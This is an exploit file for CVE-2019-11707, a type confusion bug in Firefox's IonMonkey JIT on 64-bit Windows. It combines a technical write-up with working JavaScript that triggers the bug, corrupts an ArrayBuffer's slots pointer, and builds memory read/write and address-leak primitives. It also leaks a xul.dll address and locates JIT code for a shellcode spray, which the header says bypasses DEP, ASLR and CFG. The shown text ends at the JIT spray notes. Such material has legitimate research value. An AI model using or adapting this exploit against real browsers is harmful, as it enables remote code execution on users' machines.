/*
  _______ ___ ___ _______        _______ _______ _____ _______        _____ _____ _______ _______ _______ 
 |   _   |   Y   |   _   |______|       |   _   | _   |   _   |______| _   | _   |   _   |   _   |   _   |
 |.  1___|.  |   |.  1___|______|___|   |.  |   |.|   |   |   |______|.|   |.|   |___|   |.  |   |___|   |
 |.  |___|.  |   |.  __)_        /  ___/|.  |   `-|.  |\___   |      `-|.  `-|.  |  /   /|.  |   |  /   / 
 |:  1   |:  1   |:  1   |      |:  1  \|:  1   | |:  |:  1   |        |:  | |:  | |   | |:  1   | |   |  
 |::.. . |\:.. ./|::.. . |      |::.. . |::.. . | |::.|::.. . |        |::.| |::.| |   | |::.. . | |   |  
 `-------' `---' `-------'      `-------`-------' `---`-------'        `---' `---' `---' `-------' `---'  
                                                                                                        
Exploit Title: Firefox 64-bit JIT Type Confusion
Date: 2021-12-07
Exploit Author: deadlock (Forrest Orr)
Author Homepage: https://forrest-orr.net
Vendor Homepage: https://www.mozilla.org/en-US/
Version: Firefox 66 64-bit
Tested on: Windows 7 x64, Windows 8.1 x64, Windows 10 x64
CVE: CVE-2019-11707
Bypasses: DEP, High Entropy ASLR, CFG

-----------------------------------------------------------------------------------------------

Overview
                                 
This is a Windows variation of CVE-2019-11707, an exploit targetting a type
confusion bug in the Array.pop method during inlining/IonMonkey JIT compilation
of affected code in versions of Firefox up to 66.

Fundamentally this allows for the creation oof specifally crafted malicious 
arrays, whose elements must all conform to a common/benign shape so that their
parent array type set will be immutable. 

So we have an array consisting of benign objects, all of the same type. We loop
through a JIT'd function that does an Array.pop on this malicious array and then
attempts to access this popped element. For example:

var OverflowArrays = []
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
...

var BugArrayBuf = OverflowArrays[5];
var CorruptedArrayBuf = OverflowArrays[6];
var MutableArray = OverflowArrays[7];
var BugArrayUint32 = new Uint32Array(BugArrayBuf);
var WannabeSparseArray = [BugArrayUint32, BugArrayUint32]; // Original PoC had 5 elements, only 2 are needed.

function BuggedJITFunc(Index) {
    if (WannabeSparseArray.length == 0) {
        WannabeSparseArray[1] = BugArrayUint32; // Convert target array to a sparse array, being careful to preserve the type set: if it were to change, IonMonkey will de-optimize this function back to bytecode
    }

    const Uint32Obj = WannabeSparseArray.pop();
    Uint32Obj[Index] = 0x80; // This will be an OOB index access which will fail its boundscheck prior to being confused with a Uint8Array
    for (var i = 0; i < JITIterations; i++) {} // JIT compile this function
}

var CustomPrototype = [new Uint8Array(BugArrayBuf)]; // When IonMonkey JITs the bug function it will not check the type set of this custom prototype, only its ArrayPrototype. Only one element is needed since the sparse array access will be at index 0
WannabeSparseArray.__proto__ = CustomPrototype;

// In theory only 3 should be needed (original was 2000) but it never works with 3, always works with 4.
for (var i = 0; i < 4; i++) { // The function JITs itself, this iteration count is what is required to empty out the array, make it sparse, and then make the type confusion access
    BuggedJITFunc(18); // 18*4 = 0x48: CorruptedArray.NativeObject.SlotsPtr
}

...

Now, considering how type sets, type barriers and inline caching are done in
SpiderMonkey, we can expect the following things to happen here:
1. WannabeSparseArray is given a type set consisting of Uint32Array objects. Only two are needed.
2. A custom prototype with its own indexed elements is set as the custom
   prototype for WannabeSparseArray. Very notable, is that there is only one of
   these elements (at index 0) placed into the custom prototype and most
   crucially it is *NOT* of the same type as the elements within its parent
   WannabeSparseArrray.
3. This creates an interesting object layout. Normally we culd have:
     ~ WannabeSparseArray (type set - Uint32Array) -> ArrayPrototype
     ~ But now we have WannabeSparseArray[2 elements] (type set - Uint32Array) -> CustomPrototype[1 element] (type set Uint8Array) -> ArrayPrototype

The essence of the security flaw is that before IonMonkey JITs the function, it
is checking several different type sets for optimization/security:
1. The type set of WannabeSparseArray
2. The type set of the line containing the LOAD instruction Array.pop. 
   SpiderMonkey keeps track of which types have actually been *seen* by a line
   of code, and this is the only way they are ever added to its Type Object
   Type Set. 
3. When IonMonkey activates to JIT the bugged array access function, it is going
   to generate checks in the machine code to accomodate all of these different
   type sets. For example, lets say that that IonMonkey is making machine code
   out of the line:
   
   const Uint32Obj = WannabeSparseArray.pop();
   Uint32Obj[Index] = 0x80;

   Because WannabeSparseArray is known to have only one type in its type set 
   which is Uint32Array, the only remaining question is whether the 
   WannabeSparseArray.pop() on this particular line has ever loaded a value
   which did NOT match Uint32Array (keep in mind this decision is being made
   pre-JIT, while this script is still JS byte code and will ALWAYS check type
   sets, inline caches etc. and throw clean errors if the specific type
   operations are invalid. JIT'ing of the code above would result in highly 
   optimized machine code designed to ONLY assume that the objects they are
   obtaining via Array.pop are Uint32Array: there is no safety check to ensure
   this is the case.


In this way, we may manipulate IonMonkey into generating a highly-optimized blob
of JIT'd maachine code specifically designed to Array.pop elements from an array
object we have crafted to contain hidden (malicious) elements of unexpected types
the JIT code cannot safely handle or identify (due to a lack of a Type Barrier on
the bugged array type set). 

IonMonkey at present can be tricked into generating vulnerable code as follows:
  1. Execute the function (pre-JIT) and make an inline cache/type set entry for
     each LOAD operation (such as Array.pop). In our case, Array.pop returnned
     Uint32Array and so it will be the only entry in the type set for this line
     of code since these LOAD type sets only truly incorporate new types when
     they SEE them at runtime. Now, in the event that we had set 2 different
     types of elements in our WannabeSparseArray (lets say for the sake of arguments
     a Uint32Array at [0] and a float at [1]). WannabeSparseArray would now have
     a type set containing both Uint32Array AND float, however the line which
     contains the Array.pop LOAD will only have been executed once pre-JIT, and
     thus will only have "seen" a Uint32Array type get loaded. This will cause
     the type set of the Array.pop line to still contain a single entry for
     Uint32Array since it is the only type it has seen at runtime, but it will emit
     a special tentative entry to this type set called a Type Barrier for floats,
     since even though Array.pop has never seen a float, there is a knownn possibility
     one may poppedd in the future.
  2. IonMonkey is going to generate an optimized machine code JIT stub for our
     exploit function designed to handle Uint32Array objects returned from Array.pop.
     Now, in the event that a Typoe Barrier had been attached to the type set of
     Array.pop during JIT when it was observed that the WannabeSparseArray prototype
     contains indexed elements of non-Uint32Array types, IonMonkey would have still
     generated its optimized Uint32Array machine code but would have inserted a small
     snippet of machine code to ensure that the value returned by Array.pop is NOT
     a float. If it is a float, then this entire JIT'd function will be terminated,
     de-optimized back to byte code, and (if applicable) JIT'd once again by IonMonkey
     but this time with code that handles both Uint32Array AND float since they are
     now members of the Array.pop type set (they have been observed at runtime).
    
In order to secure this code IonMonkey needed to do the following:
  1. Execute
  
~

Design

This exploit contains two shellcodes: an egg hunter/DEP bypass shellcode (which
is JIT sprayed) and a primary (stage two) shellcode stored as a static Uint8Array
for customization by the user.  

It is taking advantage of a type bug in IonMonkey wherein a JIT'd function will
only have the type sets of an Array->ArrayPrototype checked for consistency (not
a custom prototype, which are not tracked by design).

Thus we can force IonMonkey to generate an optimized machine code meant only to
handle one specific type of object from Array.pop with no dynamic runtime checks for
what the object type may truly be, and the JIT'd function may be manipulated into
accessing an unexpected type such as this if it attempts to access an empty element
index on a sparse array. In this scenario, the JS engine will check the prototype of
the array to see if it has a value at the desired index, and load it without checking
its type thus allowing a malicious value to be planted here for the purpose of Type
Confusion.          


Running through the IonMonkey logic for the 
~

Sandboxing

The Firefox sandbox prevents access to the filesystem (besides a special sandbox
temp directory) and registry but additionally (unlike IE11 on Windows 8.1) locks
down access to the desktop window session (which prevents even a MessageBoxA
from popping) and sets a child process creation quota of zero (preventing the
creation of child processes). By adjusting the sandbox content level in the FF
"about:config" settings some of these features can be disabled for testing
purposes. For example, setting the content level down from "5" (the default) to
"2" will allow MessageBoxA to pop as well as child process creation, however even
when the content level is set down to "0" there are certain protections which will
persist (such as inability to access the file system). 

~

Credits

sherl0ck  - for writing the initial analysis and PoC for CVE-2019-11707 with a
            focus on the Linux OS.
            
Mathais Baynens - who wrote excellent resources on JS engine internals including
                  inline caching, shapes, slots, etc.
*/

////////
////////
// Global helpers/settings
////////

var JITIterations = 0x10000; // Number of iterations needed to trigger JIT compilation of code. The compilation count threshold varies and this is typically overkill (10+ or 1000+ is often sufficient) but is the most stable count I've tested.
var HelperBuf = new ArrayBuffer(8);
var HelperDbl = new Float64Array(HelperBuf);
var HelperDword = new Uint32Array(HelperBuf);

var OverflowArrays = []
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20)); // <- overflow from here
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));
OverflowArrays.push(new ArrayBuffer(0x20));

var BugArrayBuf = OverflowArrays[5];
var CorruptedArrayBuf = OverflowArrays[6];
var MutableArray = OverflowArrays[7];
var BugArrayUint32 = new Uint32Array(BugArrayBuf);
var WannabeSparseArray = [BugArrayUint32, BugArrayUint32]; // Original PoC had 5 elements, only 2 are needed.

////////
////////
// Debug/timer code
////////

var EnableDebug = true;
var EnableTimers = false;
var AlertOutput = true;
var TimeStart;
var ReadCount;

function StartTimer() {
    ReadCount = 0;
    TimeStart = new Date().getTime();
}

function EndTimer(Message) {
    var TotalTime = (new Date().getTime() - TimeStart);
    
    if(EnableTimers) {
        if(AlertOutput) {
            alert("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
        else {
            console.log("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
    }
}

function DebugLog(Message) {
    if(EnableDebug) {
        if(AlertOutput) {
            alert(Message);
        }
        else {
            console.log(Message); // In IE, console only works if devtools is open.
        }
    }
}

/*//////
////////
// JIT bug logic/initialization
////////

What follows is the machine code generated by IonMonkey for the bugged JS function.

0000014FA8BC7CA0 | 48:83EC 20               | sub rsp,20                              |
0000014FA8BC7CA4 | 48:8B4424 40             | mov rax,qword ptr ss:[rsp+40]           |
0000014FA8BC7CA9 | 48:C1E8 2F               | shr rax,2F                              |
0000014FA8BC7CAD | 3D F3FF0100              | cmp eax,1FFF3                           |
0000014FA8BC7CB2 | 0F85 E3020000            | jne 14FA8BC7F9B                         |
0000014FA8BC7CB8 | 48:8B4424 48             | mov rax,qword ptr ss:[rsp+48]           |
0000014FA8BC7CBD | 48:C1E8 2F               | shr rax,2F                              |
0000014FA8BC7CC1 | 3D F1FF0100              | cmp eax,1FFF1                           |
0000014FA8BC7CC6 | 0F85 CF020000            | jne 14FA8BC7F9B                         |
0000014FA8BC7CCC | E9 04000000              | jmp 14FA8BC7CD5                         |
0000014FA8BC7CD1 | 48:83EC 20               | sub rsp,20                              |
0000014FA8BC7CD5 | 49:BB 785F225A7F000000   | mov r11,7F5A225F78                      |
0000014FA8BC7CDF | 49:3923                  | cmp qword ptr ds:[r11],rsp              |
0000014FA8BC7CE2 | 0F83 BA020000            | jae 14FA8BC7FA2                         |
0000014FA8BC7CE8 | 8B4424 48                | mov eax,dword ptr ss:[rsp+48]           |
0000014FA8BC7CEC | 894424 1C                | mov dword ptr ss:[rsp+1C],eax           |
0000014FA8BC7CF0 | 48:B9 00C1B25C7F000000   | mov rcx,7F5CB2C100                      |
0000014FA8BC7CFA | 48:8B49 10               | mov rcx,qword ptr ds:[rcx+10]           |
0000014FA8BC7CFE | 48:BA 000000000000FEFF   | mov rdx,FFFE000000000000                |
0000014FA8BC7D08 | 48:3391 00070000         | xor rdx,qword ptr ds:[rcx+700]          |
0000014FA8BC7D0F | 48:B9 B0BCC65C7F000000   | mov rcx,7F5CC6BCB0                      |
0000014FA8BC7D19 | FF21                     | jmp qword ptr ds:[rcx]                  |
0000014FA8BC7D1B | 4C:8BD9                  | mov r11,rcx                             |
0000014FA8BC7D1E | 49:C1EB 2F               | shr r11,2F                              |
0000014FA8BC7D22 | 41:81FB F1FF0100         | cmp r11d,1FFF1                          |
0000014FA8BC7D29 | 0F85 D3020000            | jne 14FA8BC8002                         |
0000014FA8BC7D2F | 8BD1                     | mov edx,ecx                             |
0000014FA8BC7D31 | 85D2                     | test edx,edx                            |
0000014FA8BC7D33 | 0F85 67000000            | jne 14FA8BC7DA0                         |
0000014FA8BC7D39 | E9 6B000000              | jmp 14FA8BC7DA9                         |
0000014FA8BC7D3E | 48:83EC 20               | sub rsp,20                              |
0000014FA8BC7D42 | 48:B9 000000000080F9FF   | mov rcx,FFF9800000000000                |
0000014FA8BC7D4C | 41:F741 FC 01000000      | test dword ptr ds:[r9-4],1              |
0000014FA8BC7D54 | 0F84 04000000            | je 14FA8BC7D5E                          |
0000014FA8BC7D5A | 49:8B49 D8               | mov rcx,qword ptr ds:[r9-28]            |
0000014FA8BC7D5E | 49:8B51 C8               | mov rdx,qword ptr ds:[r9-38]            |
0000014FA8BC7D62 | 49:8B59 C0               | mov rbx,qword ptr ds:[r9-40]            |
0000014FA8BC7D66 | 48:8B4424 48             | mov rax,qword ptr ss:[rsp+48]           |
0000014FA8BC7D6B | 4C:8BD8                  | mov r11,rax                             |
0000014FA8BC7D6E | 49:C1EB 2F               | shr r11,2F                              |
0000014FA8BC7D72 | 41:81FB F1FF0100         | cmp r11d,1FFF1                          |
0000014FA8BC7D79 | 0F85 8A020000            | jne 14FA8BC8009                         |
0000014FA8BC7D7F | 8BC0                     | mov eax,eax                             |
0000014FA8BC7D81 | 894424 1C                | mov dword ptr ss:[rsp+1C],eax           |
0000014FA8BC7D85 | 4C:8BDA                  | mov r11,rdx                             |
0000014FA8BC7D88 | 49:C1EB 2F               | shr r11,2F                              |
0000014FA8BC7D8C | 41:81FB F1FF0100         | cmp r11d,1FFF1                          |
0000014FA8BC7D93 | 0F85 77020000            | jne 14FA8BC8010                         |
0000014FA8BC7D99 | 8BC2                     | mov eax,edx                             |
0000014FA8BC7D9B | E9 B4010000              | jmp 14FA8BC7F54                         |
0000014FA8BC7DA0 | 894424 1C                | mov dword ptr ss:[rsp+1C],eax           |
0000014FA8BC7DA4 | E9 69000000              | jmp 14FA8BC7E12                         |
0000014FA8BC7DA9 | 894424 1C                | mov dword ptr ss:[rsp+1C],eax           |
0000014FA8BC7DAD | 48:B8 00C1B25C7F000000   | mov rax,7F5CB2C100                      |
0000014FA8BC7DB7 | 48:8B50 10               | mov rdx,qword ptr ds:[rax+10]           |
0000014FA8BC7DBB | 48:B9 000000000000FEFF   | mov rcx,FFFE000000000000                |
0000014FA8BC7DC5 | 48:338A 00070000         | xor rcx,qword ptr ds:[rdx+700]          |
0000014FA8BC7DCC | 48:B8 000000000000FEFF   | mov rax,FFFE000000000000                |
0000014FA8BC7DD6 | 48:3382 30070000         | xor rax,qword ptr ds:[rdx+730]          | rdx+730:"°Q‘Z"
0000014FA8BC7DDD | 48:8B11                  | mov rdx,qword ptr ds:[rcx]              |
0000014FA8BC7DE0 | 48:8B12                  | mov rdx,qword ptr ds:[rdx]              |
0000014FA8BC7DE3 | F742 08 00000400         | test dword ptr ds:[rdx+8],40000         |
0000014FA8BC7DEA | 0F85 11000000            | jne 14FA8BC7E01                         |
0000014FA8BC7DF0 | 48:8B51 18               | mov rdx,qword ptr ds:[rcx+18]           |
0000014FA8BC7DF4 | F742 F0 04000000         | test dword ptr ds:[rdx-10],4            |
0000014FA8BC7DFB | 0F85 16020000            | jne 14FA8BC8017                         |
0000014FA8BC7E01 | BA 01000000              | mov edx,1                               |
0000014FA8BC7E06 | 48:BB 18BDC65C7F000000   | mov rbx,7F5CC6BD18                      |
0000014FA8BC7E10 | FF23                     | jmp qword ptr ds:[rbx]                  |
0000014FA8BC7E12 | 48:B8 00C1B25C7F000000   | mov rax,7F5CB2C100                      |
0000014FA8BC7E1C | 48:8B48 10               | mov rcx,qword ptr ds:[rax+10]           |
0000014FA8BC7E20 | 48:B8 000000000000FEFF   | mov rax,FFFE000000000000                |
0000014FA8BC7E2A | 48:3381 00070000         | xor rax,qword ptr ds:[rcx+700]          |
0000014FA8BC7E31 | 48:B9 A0BDC65C7F000000   | mov rcx,7F5CC6BDA0                      |
0000014FA8BC7E3B | FF21                     | jmp qword ptr ds:[rcx]                  |
0000014FA8BC7E3D | 4C:8BD9                  | mov r11,rcx                             |
0000014FA8BC7E40 | 49:C1EB 2F               | shr r11,2F                              |
0000014FA8BC7E44 | 41:81FB FCFF0100         | cmp r11d,1FFFC                          |
0000014FA8BC7E4B | 0F85 87020000            | jne 14FA8BC80D8                         |
0000014FA8BC7E51 | 48:BA 000000000000FEFF   | mov rdx,FFFE000000000000                |
0000014FA8BC7E5B | 48:33D1                  | xor rdx,rcx                             |
0000014FA8BC7E5E | 33DB                     | xor ebx,ebx                             |
0000014FA8BC7E60 | 49:BB 8081B85C7F000000   | mov r11,7F5CB88180                      |
0000014FA8BC7E6A | 49:3BD3                  | cmp rdx,r11                             |
0000014FA8BC7E6D | 0F85 6C020000            | jne 14FA8BC80DF                         |
0000014FA8BC7E73 | 48:0F45D3                | cmovne rdx,rbx                          |
0000014FA8BC7E77 | 49:BB 000000000000FEFF   | mov r11,FFFE000000000000                |
0000014FA8BC7E81 | 4C:0BD8                  | or r11,rax                              |
0000014FA8BC7E84 | 4C:891C24                | mov qword ptr ss:[rsp],r11              |
0000014FA8BC7E88 | 49:BB 8081B85C7F00FEFF   | mov r11,FFFE007F5CB88180                |
0000014FA8BC7E92 | 41:53                    | push r11                                |
0000014FA8BC7E94 | 48:B9 0058225A7F000000   | mov rcx,7F5A225800                      |
0000014FA8BC7E9E | 33D2                     | xor edx,edx                             |
0000014FA8BC7EA0 | 4C:8BC4                  | mov r8,rsp                              |
0000014FA8BC7EA3 | 52                       | push rdx                                |
0000014FA8BC7EA4 | 68 20300000              | push 3020                               |
0000014FA8BC7EA9 | 49:B9 B57EBCA84F010000   | mov r9,14FA8BC7EB5                      |
0000014FA8BC7EB3 | 41:51                    | push r9                                 |
0000014FA8BC7EB5 | 4C:8B89 10010000         | mov r9,qword ptr ds:[rcx+110]           |
0000014FA8BC7EBC | 49:8961 70               | mov qword ptr ds:[r9+70],rsp            |
0000014FA8BC7EC0 | 6A 00                    | push 0                                  |
0000014FA8BC7EC2 | 4C:8BCC                  | mov r9,rsp                              |
0000014FA8BC7EC5 | 48:83E4 F0               | and rsp,FFFFFFFFFFFFFFF0                |
0000014FA8BC7EC9 | 41:51                    | push r9                                 |
0000014FA8BC7ECB | 48:83EC 28               | sub rsp,28                              |
0000014FA8BC7ECF | E8 4C020000              | call 14FA8BC8120                        |
0000014FA8BC7ED4 | 48:83C4 28               | add rsp,28                              |
0000014FA8BC7ED8 | 5C                       | pop rsp                                 |
0000014FA8BC7ED9 | A8 FF                    | test al,FF                              |
0000014FA8BC7EDB | 0F84 2F020000            | je 14FA8BC8110                          |
0000014FA8BC7EE1 | 48:8B4C24 20             | mov rcx,qword ptr ss:[rsp+20]           |
0000014FA8BC7EE6 | 0FAEE8                   | lfence                                  |
0000014FA8BC7EE9 | 48:83C4 28               | add rsp,28                              |
0000014FA8BC7EED | 4C:8BD9                  | mov r11,rcx                             |
0000014FA8BC7EF0 | 49:C1EB 2F               | shr r11,2F                              |
0000014FA8BC7EF4 | 41:81FB FCFF0100         | cmp r11d,1FFFC                          |
0000014FA8BC7EFB | 0F85 E5010000            | jne 14FA8BC80E6                         |
0000014FA8BC7F01 | 48:B8 000000000000FEFF   | mov rax,FFFE000000000000                |
0000014FA8BC7F0B | 48:33C1                  | xor rax,rcx                             |
0000014FA8BC7F0E | 33D2                     | xor edx,edx                             |
0000014FA8BC7F10 | 49:BB F02DB75C7F000000   | mov r11,7F5CB72DF0                      |
0000014FA8BC7F1A | 4C:3918                  | cmp qword ptr ds:[rax],r11              |
0000014FA8BC7F1D | 0F85 CA010000            | jne 14FA8BC80ED                         |
0000014FA8BC7F23 | 48:0F45C2                | cmovne rax,rdx                          |
0000014FA8BC7F27 | 8B48 28                  | mov ecx,dword ptr ds:[rax+28]           |
0000014FA8BC7F2A | 48:8B40 38               | mov rax,qword ptr ds:[rax+38]           |
0000014FA8BC7F2E | 8B5424 1C                | mov edx,dword ptr ss:[rsp+1C]           |
0000014FA8BC7F32 | 45:33DB                  | xor r11d,r11d                           |
0000014FA8BC7F35 | 3BD1                     | cmp edx,ecx                             |
0000014FA8BC7F37 | 0F83 0B000000            | jae 14FA8BC7F48                         |
0000014FA8BC7F3D | 41:0F43D3                | cmovae edx,r11d                         |
0000014FA8BC7F41 | C70490 80000000          | mov dword ptr ds:[rax+rdx*4],80         | <- Type confusion: IonMonkey JIT'd an index access for Uint32Array with a DWORD operand. By confusing the type with Uint8Array we can pass the boundscheck and corrupt 32-bits out of bounds with the SIB of this instruction
0000014FA8BC7F48 | 48:B9 000000000080F9FF   | mov rcx,FFF9800000000000                |
0000014FA8BC7F52 | 33C0                     | xor eax,eax                             |
0000014FA8BC7F54 | 8B5424 1C                | mov edx,dword ptr ss:[rsp+1C]           |
0000014FA8BC7F58 | 49:BB 545F225A7F000000   | mov r11,7F5A225F54                      |
0000014FA8BC7F62 | 41:833B 00               | cmp dword ptr ds:[r11],0                |
0000014FA8BC7F66 | 0F85 88010000            | jne 14FA8BC80F4                         |
0000014FA8BC7F6C | 3D 00000100              | cmp eax,10000                           |
0000014FA8BC7F71 | 0F8D 05000000            | jge 14FA8BC7F7C                         |
0000014FA8BC7F77 | 83C0 01                  | add eax,1                               |
0000014FA8BC7F7A | EB DC                    | jmp 14FA8BC7F58                         |
0000014FA8BC7F7C | 48:83C4 20               | add rsp,20                              |
0000014FA8BC7F80 | C3                       | ret                                     |                                                                                 
*/

function BuggedJITFunc(Index) {
    if (WannabeSparseArray.length == 0) {
        WannabeSparseArray[1] = BugArrayUint32; // Convert target array to a sparse array, being careful to preserve the type set: if it were to change, IonMonkey will de-optimize this function back to bytecode
    }

    const Uint32Obj = WannabeSparseArray.pop();
    Uint32Obj[Index] = 0x80; // This will be an OOB index access which will fail its boundscheck prior to being confused with a Uint8Array
    for (var i = 0; i < JITIterations; i++) {} // JIT compile this function
}

var CustomPrototype = [new Uint8Array(BugArrayBuf)]; // When IonMonkey JITs the bug function it will not check the type set of this custom prototype, only its ArrayPrototype. Only one element is needed since the sparse array access will be at index 0
WannabeSparseArray.__proto__ = CustomPrototype;

// In theory only 3 should be needed (original was 2000) but it never works with 3, always works with 4.
for (var i = 0; i < 4; i++) { // The function JITs itself, this iteration count is what is required to empty out the array, make it sparse, and then make the type confusion access
    BuggedJITFunc(18); // 18*4 = 0x48: CorruptedArray.NativeObject.SlotsPtr
	
	/*
	ArrayBuffer in memory:
	
                  +-> group                +->shape
                  |                        |
0x7f8e13a88280:  0x00007f8e13a798e0  0x00007f8e13aa1768

                  +-> slots                +->elements (Empty in this case)
                  |                        |
0x7f8e13a88290:  0x0000000000000000  0x000055d6ee8ead80

                  +-> Shifted pointer
                  |   pointing to          +-> size in bytes of the data buffer
                  |   data buffer          |
0x7f8e13a882a0:  0x00003fc709d44160  0xfff8800000000020

                  +-> Pointer
                  |   pointing to          +-> flags
                  |   first view           |
0x7f8e13a882b0:  0xfffe7f8e15e00480  0xfff8800000000000
	*/
}

// Initialize mutable array properties for R/W/AddressOf primitives. Use these specific values so that it can later be verified whether slots pointer modifications have been successful.

MutableArray.x = 5.40900888e-315; // Most significant bits are 0 - no tag, allows an offset of 4 to be treated as a double
MutableArray.y = 0x41414141;
MutableArray.z = 0; // Least significant bits are 0 - offset of 4 means that y will be treated as a double

var CorruptedClone = new Uint8Array(OverflowArrays[6]);

/*//////
////////
// Exploit primitives
///////*/

function LeakSlotsPtr() {
    var SavedSlotsPtrBytes = CorruptedClone.slice(0x30, 0x38);
    var LeakedSlotsPtrDbl = new Float64Array(SavedSlotsPtrBytes.buffer);
    return LeakedSlotsPtrDbl;
}

function SetSlotsPtr(NewSlotsPtrDbl) {
    HelperDbl[0] = NewSlotsPtrDbl;
    
    for(var i = 0; i < 8; i++) {
        var Temp = new Uint8Array(HelperBuf);
        CorruptedClone[0x30 + i] = Temp[i];
    }
}

function WeakLeakDbl(TargetAddress) {
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    SetSlotsPtr(TargetAddress);
    var LeakedDbl = MutableArray.x;
    SetSlotsPtr(SavedSlotsPtrDbl);
    return LeakedDbl;
}

function WeakWriteDbl(TargetAddress, Val) { 
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    SetSlotsPtr(TargetAddress);
    MutableArray.x = Val;
    SetSlotsPtr(SavedSlotsPtrDbl);
}

function WeakLeakObjectAddress(Obj) {
    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????????????] | [Target object address] | [0x????????????????]
    MutableArray.y = Obj;

    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????Target o] | [bject adress????????] | [0x????????????????]
    
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    HelperDbl[0] = SavedSlotsPtrDbl;
    HelperDword[0] = HelperDword[0] + 4;
    SetSlotsPtr(HelperDbl[0]);
    
    // Patch together a double of the target object address from the two 32-bit property values
    
    HelperDbl[0] = MutableArray.x;
    var LeakedLow = HelperDword[1];
    HelperDbl[0] = MutableArray.y; // Works in release, not in debug (assertion issues)
    var LeakedHigh = HelperDword[0] & 0x00007fff; // Filter off tagged pointer bits
    SetSlotsPtr(SavedSlotsPtrDbl);
    HelperDword[0] = LeakedLow;
    HelperDword[1] = LeakedHigh;
    
    return HelperDbl[0];
}

var ExplicitDwordArray = new Uint32Array(1); // Used for the strong write
var ExplicitDwordArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read
var ExplicitDblArray = new Float64Array(1); // Used for the strong read
var ExplicitDblArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read
var LeakedXulAddress = null;

function InitStrongRWPrimitive() {
	// Leak data view pointers from the ExplicitDwordArray and ExplicitDwordArray ArrayBuffer struct
	
    LeakedXulAddress = HelperDbl[0] = WeakLeakObjectAddress(ExplicitDblArray);
	//DebugLog("Float64Array NativeObject: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
    HelperDword[0] = HelperDword[0] + 0x38; // Float64Array data view pointer (same as ArrayBuffer)
    ExplicitDblArrayDataPtr = HelperDbl[0];
    HelperDbl[0] = WeakLeakObjectAddress(ExplicitDwordArray);
    HelperDword[0] = HelperDword[0] + 0x38; // Uint32Array data view pointer (same as ArrayBuffer)
    ExplicitDwordArrayDataPtr = HelperDbl[0];
	
	// Leak the default/initial value of the Float64Array NativeObject.ElementPtr to obtain address within xul.dll
	
	HelperDbl[0] = LeakedXulAddress;
	HelperDword[0] = HelperDword[0] + 0x18; // Element pointer will initially hold an address within xul.dll
	LeakedXulAddress = HelperDbl[0];
    HelperDbl[0] = LeakedXulAddress = WeakLeakDbl(LeakedXulAddress);
	DebugLog("Leaked xul.dll address: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
}

function ExplicitLeakDbl(TargetAddress) {
    WeakWriteDbl(ExplicitDblArrayDataPtr, TargetAddress);
    return ExplicitDblArray[0];
}

function StrongWriteDword(TargetAddress, Value) {
    WeakWriteDbl(ExplicitDwordArrayDataPtr, TargetAddress);
    ExplicitDwordArray[0] = Value;
}

function GetJSFuncJITInfoPtr(JSFuncObj) {
    HelperDbl[0] = WeakLeakObjectAddress(JSFuncObj); // The JSFunction object address associated with the (now JIT compiled) shellcode data.
    HelperDword[0] = HelperDword[0] + 0x30; // JSFunction.u.native.extra.jitInfo_ contains a pointer to the +RX JIT region at offset 0 of its struct.
    var JITInfoAddress = WeakLeakDbl(HelperDbl[0]);
    HelperDbl[0] = JITInfoAddress;
    
    if(HelperDword[0] == 0x41414141) {
        //DebugLog("Arbitrary read primitive failed");
        window.location.reload();
        return 0.0;
    }
    
    return JITInfoAddress;
}

function GetJSFuncJITCodePtr(JSFuncObj) {
    var JITInfoAddress = GetJSFuncJITInfoPtr(JSFuncObj);
    
    if(JITInfoAddress) {
        var JITCodePtr = WeakLeakDbl(JITInfoAddress); // Leak the address to the compiled JIT assembly code associated with the JIT'd shellcode function from its JitInfo struct (it is a pointer at offset 0 of this struct)
        return JITCodePtr;
    }
    
    return 0.0;
}

function LeakXulBase() {
	/*
	Float64Array NativeObject
	
	struct NativeObject {
		void *GroupPtr;
		void *ShapePtr;
		void *SlotsPtr;
		void *ElementsPtr; // This does NOT point to the element metadata, it points OVER it to the actual element data itself.
	}

	0000029E4C834290  0000029E4EDA9AC1  Á.ÚN....  <- Group pointer
	0000029E4C834298  0000029E4C831200  ...L....  
	0000029E4C8342A0  0000000000000000  ........  
	0000029E4C8342A8  00007FFAFB9B1BB0  °..ûú...  <- Element pointer (xul.dll base: 00007FFAF73F0000)
	
	
	*/
	
	
}
    
/*//////
////////
// JIT spray/egghunter shellcode logic
////////

JIT spray in modern Firefox 64-bit on Windows seems to behave very differently
when a special threshold of 100 double float constants are planted into a single
function and JIT sprayed. When more than 100 are implanted, the JIT code pointer
for the JIT sprayed function will look as follows:

00000087EB6F5280 | E9 23000000              | jmp 87EB6F52A8                   <- JIT code pointer for JIT sprayed function points here
00000087EB6F5285 | 48:B9 00D0F2F8F1000000   | mov rcx,F1F8F2D000                   
00000087EB6F528F | 48:8B89 60010000         | mov rcx,qword ptr ds:[rcx+160]       
00000087EB6F5296 | 48:89A1 D0000000         | mov qword ptr ds:[rcx+D0],rsp        
00000087EB6F529D | 48:C781 D8000000 0000000 | mov qword ptr ds:[rcx+D8],0          
00000087EB6F52A8 | 55                       | push rbp                             
00000087EB6F52A9 | 48:8BEC                  | mov rbp,rsp                          
00000087EB6F52AC | 48:83EC 48               | sub rsp,48                           
00000087EB6F52B0 | C745 E8 00000000         | mov dword ptr ss:[rbp-18],0          
...
